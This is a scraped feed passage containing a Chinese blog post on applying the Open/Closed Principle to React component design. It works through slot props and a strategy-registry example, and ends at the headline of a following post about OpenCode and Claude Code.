hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><blockquote>
<p><strong>写在前面</strong></p>
<p>兄弟们，回想一下，你有没有接过这种需求：</p>
<p>产品经理跑来说：“咱们那个通用的表格组件，现在需要在某一列加个自定义的渲染逻辑，以前是纯文本，现在要变成个带图标的按钮，还能点击弹窗。”</p>
<p>你心想：“这还不简单？”</p>
<p>于是你打开了那个祖传的 <code>CommonTable.vue</code> 或 <code>Table.tsx</code>，找到了渲染单元格的地方，熟练地写下了一个 <code>if-else</code>。</p>
<p>过了两天，产品又来了：“那啥，另一列也要改，这次要加个进度条。”</p>
<p>你又熟练地加了一个 <code>else-if</code>。</p>
<p>几个月后，这个组件的源码已经突破了 2000 行，光那个 <code>if-else</code> 的判断逻辑就占了半屏。后来的同事接手时，看着这坨代码，只想把你拉黑。</p>
<p>这种“改哪哪疼，牵一发而动全身”的代码，就是典型的违反了<strong>开闭原则 (Open/Closed Principle, OCP)</strong> 。今天咱们就来聊聊，怎么用 OCP 把这坨代码重构成“人话”。</p>
</blockquote>
<hr/>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/362af4a3a08c45f6b5e79878e0393259~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv546L5aOu5aOu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534978&amp;x-signature=8LBXGrcsSdhSyyEzCMGIidC2Ruo%3D" alt="39072abf-1240-4203-a664-62f3074c67cd.png" loading="lazy"/></p>
<h2 data-id="heading-0">什么是开闭原则 (OCP)？</h2>
<p>开闭原则，听起来很高大上，其实说人话就是八个字：</p>
<p><strong>对扩展开放，对修改关闭。</strong></p>
<ul>
<li><strong>对扩展开放 (Open for extension)</strong> ：当有新需求来了，你应该能通过“增加新代码”的方式来满足，而不是去改旧代码。</li>
<li><strong>对修改关闭 (Closed for modification)</strong> ：那个已经写好、测试过、稳定运行的核心代码，你尽量别去动它。</li>
</ul>
<p>想象一下你的电脑主机。你想加个显卡，是直接把主板焊开接线（修改），还是找个 PCI-E 插槽插上去（扩展）？显然后者更靠谱。</p>
<p>在前端领域，OCP 最典型的应用场景就是<strong>组件设计</strong>和<strong>插件系统</strong>。</p>
<hr/>
<h2 data-id="heading-1">案例分析：一个“违反 OCP”的糟糕组件</h2>
<p>咱们就拿最常见的<strong>通用列表项组件</strong>来举例。假设我们有一个 <code>ListItem</code> 组件，用来展示用户信息。</p>
<h3 data-id="heading-2">原始需求</h3>
<p>需求很简单：展示用户的头像和名字。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ListItem.tsx (V1)</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">avatar</span>: <span class="hljs-built_in">string</span>;
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">ListItem</span> = (<span class="hljs-params">{ user }: { user: User }</span>) =&gt; {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"list-item"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">{user.avatar}</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">{user.name}</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{user.name}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};
</code></pre>
<p>这代码看起来没毛病，清爽、简单。</p>
<h3 data-id="heading-3">需求变更 1：加个 VIP 标志</h3>
<p>产品说：“有些用户是 VIP，名字后面得加个金灿灿的皇冠图标。”</p>
<p>你心想，小case，一把梭：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ListItem.tsx (V2 - 开始变味了)</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">avatar</span>: <span class="hljs-built_in">string</span>;
  isVip?: <span class="hljs-built_in">boolean</span>; <span class="hljs-comment">// 新增字段</span>
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">ListItem</span> = (<span class="hljs-params">{ user }: { user: User }</span>) =&gt; {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"list-item"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">{user.avatar}</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">{user.name}</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{user.name}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
      {/* 修改点：硬编码逻辑 */}
      {user.isVip &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"vip-icon"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};
</code></pre>
<p>你为了这个新需求，<strong>修改</strong>了 <code>ListItem</code> 组件的内部实现。虽然只加了一行，但坏头已经开了。</p>
<h3 data-id="heading-4">需求变更 2：再加个在线状态</h3>
<p>产品又来了：“得显示用户在不在线，在线的头像旁边亮个绿灯。”</p>
<p>你叹了口气，继续梭：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ListItem.tsx (V3 - 味道越来越冲)</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">avatar</span>: <span class="hljs-built_in">string</span>;
  isVip?: <span class="hljs-built_in">boolean</span>;
  isOnline?: <span class="hljs-built_in">boolean</span>; <span class="hljs-comment">// 又新增字段</span>
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">ListItem</span> = (<span class="hljs-params">{ user }: { user: User }</span>) =&gt; {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"list-item"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"avatar-wrapper"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">{user.avatar}</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">{user.name}</span> /&gt;</span>
        {/* 修改点：又硬编码逻辑 */}
        {user.isOnline &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"online-dot"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>}
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{user.name}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
      {user.isVip &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"vip-icon"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};
</code></pre>
<p><strong>问题来了：</strong></p>
<ol>
<li><strong>组件越来越臃肿</strong>：每次新需求都要改这个文件，代码量蹭蹭涨。</li>
<li><strong>耦合度极高</strong>：<code>ListItem</code> 竟然要知道什么是 VIP，什么是在线状态。如果明天要加个“等级勋章”、“活动挂件”呢？</li>
<li><strong>测试困难</strong>：每次改动都得把以前的 VIP、在线状态全测一遍，生怕改坏了。</li>
</ol>
<p>这就是典型的<strong>违反了对修改关闭</strong>。核心组件被迫了解太多它不该知道的业务逻辑。</p>
<hr/>
<h2 data-id="heading-5">重构：用 OCP 把“屎山”铲平</h2>
<p>怎么让 <code>ListItem</code> 既能支持各种花里胡哨的展示，又不用每次都改它呢？</p>
<p>答案就是：<strong>把变化的部分抽离出去，留下不变的骨架。</strong></p>
<ul>
<li><strong>不变的部分</strong>：列表项的基本结构（左边是图，右边是文字）。</li>
<li><strong>变化的部分</strong>：头像旁边要加什么装饰？文字后面要挂什么配件？</li>
</ul>
<p>我们可以利用 React 的 <strong>组合 (Composition)</strong> 特性，比如 <code>children</code> 或者 <strong>Render Props</strong>（插槽槽位）。</p>
<h3 data-id="heading-6">重构 V1：使用插槽 (Slots / Render Props)</h3>
<p>我们改造一下 <code>ListItem</code>，让它别管那么多闲事，只负责提供“坑位”。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ListItem.tsx (OCP版本)</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">ListItemProps</span> {
  <span class="hljs-attr">avatar</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">ReactNode</span>; <span class="hljs-comment">// 不再只传字符串，直接传节点</span>
  <span class="hljs-attr">title</span>: <span class="hljs-title class_">React</span>.<span class="hljs-property">ReactNode</span>;  <span class="hljs-comment">// 同上</span>
  <span class="hljs-comment">// 预留两个扩展槽位</span>
  avatarAddon?: <span class="hljs-title class_">React</span>.<span class="hljs-property">ReactNode</span>;
  titleAddon?: <span class="hljs-title class_">React</span>.<span class="hljs-property">ReactNode</span>;
}

<span class="hljs-comment">// 这个组件现在稳定得一批，几乎不需要再修改了</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">ListItem</span> = (<span class="hljs-params">{ avatar, title, avatarAddon, titleAddon }: ListItemProps</span>) =&gt; {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"list-item"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"avatar-wrapper"</span>&gt;</span>
        {avatar}
        {/* 扩展点：头像装饰 */}
        {avatarAddon}
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"title-wrapper"</span>&gt;</span>
        {title}
        {/* 扩展点：标题装饰 */}
        {titleAddon}
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};
</code></pre>
<p>现在，核心组件 <code>ListItem</code> 对修改是关闭的。那怎么扩展新需求呢？</p>
<p><strong>在使用它的地方进行扩展（对扩展开放）：</strong></p>
<pre><code class="hljs language-ini" lang="ini">// UserList.tsx (业务层)
import ListItem from './ListItem'<span class="hljs-comment">;</span>

const <span class="hljs-attr">UserList</span> = ({ users }) =&gt; {
  return (
    &lt;div&gt;
      {users.map(<span class="hljs-attr">user</span> =&gt; (
        &lt;ListItem
          <span class="hljs-attr">key</span>={user.id}
          // 基础信息
          <span class="hljs-attr">avatar</span>={&lt;img src={user.avatar} /&gt;}
          <span class="hljs-attr">title</span>={&lt;span&gt;{user.name}&lt;/span&gt;}
          // 扩展需求1：在线状态
          <span class="hljs-attr">avatarAddon</span>={user.isOnline ? &lt;<span class="hljs-literal">On</span>lineDot /&gt; : null}
          // 扩展需求2：VIP标识
          <span class="hljs-attr">titleAddon</span>={user.isVip ? &lt;VipCrown /&gt; : null}
        /&gt;
      ))}
    &lt;/div&gt;
  )<span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>
</code></pre>
<p><strong>看！世界清静了。</strong></p>
<ul>
<li><code>ListItem</code> 组件不知道也不关心什么是 VIP。它只知道：“如果有人给了我 <code>titleAddon</code>，那我就把它渲染在标题后面。”</li>
<li>如果明天产品要加个“等级勋章”，你只需要写个 <code>&lt;LevelBadge /&gt;</code> 组件，然后传给 <code>titleAddon</code> 即可。<strong><code>ListItem.tsx</code> 文件一个字都不用改。</strong></li>
</ul>
<p>这就是 OCP 的魅力。</p>
<hr/>
<h2 data-id="heading-7">进阶：策略模式与配置化</h2>
<p>在更复杂的场景下，比如我们开头提到的通用表格组件，每一列的渲染逻辑可能千奇百怪。这时候光用插槽可能还不够灵活。</p>
<p>我们可以借鉴<strong>策略模式</strong>的思想，结合配置化来实现 OCP。</p>
<p>假设我们有一个复杂的后台管理表格。</p>
<h3 data-id="heading-8">糟糕的设计 (违反 OCP)</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// BadTableColumn.tsx</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">renderCell</span> = (<span class="hljs-params">value, columnType</span>) =&gt; {
  <span class="hljs-comment">// 地狱 if-else </span>
  <span class="hljs-keyword">if</span> (columnType === <span class="hljs-string">'text'</span>) {
    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{value}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span>;
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (columnType === <span class="hljs-string">'image'</span>) {
    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">{value}</span> /&gt;</span></span>;
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (columnType === <span class="hljs-string">'link'</span>) {
    <span class="hljs-comment">// ...要加新类型就得改这里</span>
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (columnType === <span class="hljs-string">'status'</span>) {
     <span class="hljs-comment">// ...越来越长</span>
  }
  <span class="hljs-comment">// ...</span>
};
</code></pre>
<h3 data-id="heading-9">符合 OCP 的设计</h3>
<p>我们定义一个策略注册表，把每种类型的渲染逻辑注册进去。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// renderStrategies.tsx (策略定义)</span>
<span class="hljs-keyword">const</span> strategies = {
  <span class="hljs-attr">text</span>: <span class="hljs-function">(<span class="hljs-params">value</span>) =&gt;</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{value}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span>,
  <span class="hljs-attr">image</span>: <span class="hljs-function">(<span class="hljs-params">value</span>) =&gt;</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">{value}</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"table-img"</span> /&gt;</span></span>,
  <span class="hljs-comment">// 新需求：状态标签</span>
  <span class="hljs-attr">status</span>: <span class="hljs-function">(<span class="hljs-params">value</span>) =&gt;</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Tag</span> <span class="hljs-attr">color</span>=<span class="hljs-string">{value</span> === <span class="hljs-string">'active'</span> ? '<span class="hljs-attr">green</span>' <span class="hljs-attr">:</span> '<span class="hljs-attr">red</span>'}&gt;</span>{value}<span class="hljs-tag">&lt;/<span class="hljs-name">Tag</span>&gt;</span></span>,
};

<span class="hljs-comment">// 提供注册入口（对扩展开放）</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">registerStrategy</span> = (<span class="hljs-params"><span class="hljs-keyword">type</span>, renderer</span>) =&gt; {
  strategies[<span class="hljs-keyword">type</span>] = renderer;
};

<span class="hljs-comment">// 提供获取入口</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">getStrategy</span> = (<span class="hljs-params"><span class="hljs-keyword">type</span></span>) =&gt; {
  <span class="hljs-keyword">return</span> strategies[<span class="hljs-keyword">type</span>] || strategies[<span class="hljs-string">'text'</span>];
};
</code></pre>
<p>然后，表格组件只负责调用策略：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// GoodTableColumn.tsx</span>
<span class="hljs-keyword">import</span> { getStrategy } <span class="hljs-keyword">from</span> <span class="hljs-string">'./renderStrategies'</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title function_">TableCell</span> = (<span class="hljs-params">{ value, columnType }</span>) =&gt; {
  <span class="hljs-comment">// 核心组件对修改关闭：它不需要知道具体怎么渲染</span>
  <span class="hljs-keyword">const</span> renderer = <span class="hljs-title function_">getStrategy</span>(columnType);
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>{renderer(value)}<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span>;
};
</code></pre>
<p>当你要新增一种“进度条”类型的列时，你根本不需要碰 <code>TableCell</code> 组件，只需要在项目的入口文件里注册一个新的策略：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// main.js (应用入口)</span>
<span class="hljs-keyword">import</span> { registerStrategy } <span class="hljs-keyword">from</span> <span class="hljs-string">'./renderStrategies'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ProgressBar</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./components/ProgressBar'</span>;

<span class="hljs-comment">// 扩展新能力</span>
<span class="hljs-title function_">registerStrategy</span>(<span class="hljs-string">'progress'</span>, <span class="hljs-function">(<span class="hljs-params">value</span>) =&gt;</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ProgressBar</span> <span class="hljs-attr">percent</span>=<span class="hljs-string">{value}</span> /&gt;</span></span>);
</code></pre>
<p>这就实现了一个简易的插件化系统。核心库稳定不变，业务方通过注册机制无限扩展能力。</p>
<hr/>
<h2 data-id="heading-10">总结：别让自己成为“改Bug机器”</h2>
<p>开闭原则不是什么高深的理论，它就是为了让你少加班、少背锅而生的。</p>
<p><strong>记住这几个实战要点：</strong></p>
<ol>
<li><strong>识别变化点</strong>：做组件之前先想想，哪些是铁打不动的骨架，哪些是流水易变的皮肉。</li>
<li><strong>多用组合/插槽</strong>：React 的 <code>children</code> 和 Render Props，Vue 的 <code>slot</code>，都是实现 OCP 的利器。把决定权交给使用者，而不是自己大包大揽。</li>
<li><strong>善用策略/配置</strong>：遇到复杂的 <code>if-else</code> 逻辑判断渲染类型时，考虑用映射表（Map 对象）代替硬编码，把逻辑抽离出去。</li>
</ol>
<p>下次再遇到产品经理不断提新需求，希望你能自信地打开代码，优雅地新增一个文件，而不是痛苦地在那坨几千行的祖传代码里加 <code>if-else</code>。</p>
<p>Keep coding, keep open!</p>
<hr/>
<blockquote>
<p><strong>互动话题</strong></p>
<p>你的项目里有没有那种因为违反 OCP 而变得维护困难的“超级组件”？你又是怎么重构它的？欢迎在评论区吐槽交流！</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[OpenCode真的可以挑战Claude Code]]></title>    <link>https://juejin.cn/post/7592996072705179698</link>    <guid>https://juejin.cn/post/7592996072705179698</guid>    <pubDate>2026-01-09T03:46:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592996072705179698" data-draft-id="7592906873089343534" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="OpenCode真的可以挑战Claude Code"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-09T03:46:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="大橙子打游戏"/> <meta itemprop="url" content="https://juejin.cn/user/1081575170907086"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            OpenCode真的可以挑战Claude Code
